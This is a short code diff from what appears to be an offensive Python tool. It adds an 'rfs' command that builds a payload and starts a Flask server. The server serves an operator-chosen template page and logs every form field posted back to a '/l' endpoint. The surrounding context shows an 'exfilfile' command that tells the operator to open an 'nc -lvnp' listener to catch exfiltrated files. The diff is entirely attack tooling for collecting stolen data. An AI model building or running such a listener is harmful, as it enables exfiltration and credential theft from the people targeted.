@@ -84,3 +84,20 @@ if args.command == "exfilfile":
 							
 	if args.method == "nc":
 		print(f"on your machine run the following:\n\tnc -lvnp{args.port}")
+
+if args.command == "rfs":
+	comm=payloads.RFS.run(args.ip, args.port, args.schema)
+	routeres(comm,args.local)
+	from flask import Flask, request, render_template
+	app = Flask(__name__)
+	@app.route("/rfs",methods=["GET"])
+	def rfs(rfvs=args.vars):
+		rfsvars={v.split(":",1)[0]:v.split(":",1)[1] for v in rfvs}
+		return render_template(os.path.join("rfs",args.file),rfsvars=rfsvars)
+	@app.route("/l",methods=["POST"])
+	def listen():
+		for key in request.form.keys():
+			print(f"{key}:{request.form[key]}")
+		return ""
+	if __name__ == "__main__":
+		app.run(host=args.ip, port=int(args.port))
